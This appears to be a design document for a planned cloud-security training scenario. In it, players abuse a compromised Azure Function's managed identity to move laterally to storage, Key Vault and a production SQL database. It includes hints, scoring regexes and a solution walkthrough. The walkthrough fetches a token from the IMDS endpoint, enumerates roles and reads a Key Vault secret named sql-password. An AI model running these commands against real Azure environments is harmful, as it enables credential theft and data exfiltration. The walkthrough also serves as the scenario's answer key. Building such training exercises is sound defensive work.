# Scenario 07: Managed Identity Abuse

**Status:** Planned
**Difficulty:** Intermediate
**Estimated Time:** 30-35 minutes

## Overview

Players exploit a compromised Azure resource's managed identity to perform lateral movement and access other Azure resources the identity has permissions to.

## Learning Objectives

- Understand system-assigned vs user-assigned managed identities
- Learn managed identity permission enumeration
- Recognize lateral movement opportunities via managed identities
- Understand managed identity security boundaries

## Attack Narrative

You've compromised an Azure Function that has a managed identity with excessive permissions. Your goal is to enumerate what the managed identity can access and use it to move laterally to other resources, eventually reaching a production database.

## Starting Intel

- Compromised: Azure Function `func-data-processor`
- Identity: System-assigned managed identity
- Known permissions: Can access multiple storage accounts
- Target: Production SQL Database

## Resources

### Azure Function: func-data-processor
- Resource Group: functions-rg
- Identity: System-assigned
- Principal ID: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx

### Managed Identity Permissions
| Resource | Role |
|----------|------|
| storage-dev | Storage Blob Data Reader |
| storage-prod | Storage Blob Data Contributor |
| sql-prod | SQL DB Contributor |
| keyvault-prod | Secrets User |

### Lateral Movement Path
```
Function (compromised)
    ↓ (IMDS token)
Storage Account (data discovery)
    ↓ (credentials in config)
Key Vault (secret access)
    ↓ (SQL credentials)
SQL Database (data exfiltration)
```

## Objectives

| Order | ID | Description | Trigger | Points |
|-------|-----|-------------|---------|--------|
| 1 | get_mi_token | Obtain managed identity token via IMDS | `curl.*169.254.169.254.*token` | 75 |
| 2 | enum_permissions | Enumerate managed identity permissions | `az role assignment list` | 100 |
| 3 | access_storage | Use identity to access storage | `az storage.*--auth-mode login` | 125 |
| 4 | lateral_movement | Access Key Vault or SQL using the identity | `regex:keyvault\|sql` | 175 |

**Total Points:** 475

## Hints

### get_mi_token
- Level 1 (15 pts): "Managed identities get tokens from IMDS"
- Level 2 (35 pts): "curl -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?resource=https://management.azure.com/'"

### enum_permissions
- Level 1 (20 pts): "What Azure resources can this identity access?"
- Level 2 (50 pts): "az role assignment list --assignee <principal-id>"

### access_storage
- Level 1 (25 pts): "Managed identities can authenticate to storage without keys"
- Level 2 (60 pts): "az storage blob list --account-name storage-prod --auth-mode login"

### lateral_movement
- Level 1 (35 pts): "The identity has access to more than just storage..."
- Level 2 (85 pts): "Check Key Vault access or SQL database permissions"

## Solution Walkthrough

```bash
# Step 1: Get managed identity token
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Step 2: List role assignments for the identity
az role assignment list --assignee <principal-id> --all

# Step 3: Access storage using managed identity
az storage blob list --account-name storage-prod --container-name data --auth-mode login

# Step 4: Lateral movement to Key Vault
az keyvault secret list --vault-name keyvault-prod
az keyvault secret show --vault-name keyvault-prod --name sql-password

# Or direct SQL access
az sql db list --server sql-prod --resource-group prod-rg
```

## Debrief Topics

- Managed identity scope and permissions
- System vs user-assigned identities
- Cross-resource access patterns
- Principle of least privilege for identities
- Monitoring managed identity usage
- Workload identity federation

## Real-World References

- MITRE ATT&CK: T1550.001 (Use Alternate Authentication Material: Application Access Token)
- Azure Security: Managed identity best practices
- Microsoft Defender for Cloud: Identity recommendations

## Implementation Notes

Requires:
- Enhanced IMDS mock for various resource tokens
- az role assignment with managed identity principal
- --auth-mode login support for storage commands
- Cross-resource access simulation
